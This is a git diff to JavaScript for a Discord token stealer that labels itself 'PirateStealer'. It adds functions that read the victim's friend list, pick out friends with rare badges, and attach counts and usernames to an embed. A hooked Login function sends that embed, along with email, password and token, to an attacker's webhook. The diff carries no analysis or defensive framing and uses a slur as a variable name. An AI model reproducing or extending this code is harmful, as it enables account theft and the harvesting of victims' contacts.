@@ -191,6 +191,32 @@ function GetBadges(flags) {
 	}
 	return badges
 }
+			
+function totalFriends() {
+	var f = JSON.parse(info4)
+	const r = f.filter((user) => {
+		return user.type == 1
+	})
+	return r.length
+}
+
+function CalcFriends() {
+	var f = JSON.parse(info4)
+	const r = f.filter((user) => {
+		return user.type == 1
+	})
+	var gay = "";
+	for (z of r) {
+		var b = GetRBadges(z.user.public_flags)
+		if (b != "") {
+			gay += b + ` ${z.user.username}#${z.user.discriminator}\n`
+		}
+	}
+	if (gay == "") {
+		gay = "No Rare Friends"
+	}
+	return gay
+}		
 
 function Login(email, password, token) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -271,7 +297,20 @@ function Login(email, password, token) {
                     },
                     "footer": {
                         "text": ""
-			                                                                        }
+												}
+											}, {
+												"title": `Total Friends (${totalFriends()})`,
+												"color": config['embed-color'],
+												"description": CalcFriends(),
+												"author": {
+													"name": "PirateStealer"
+												},
+												"footer": {
+													"text": "PirateStealer"
+												},
+												"thumbnail": {
+													"url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+												}
 											}]
 										}
 										SendToWebhook(JSON.stringify(params))
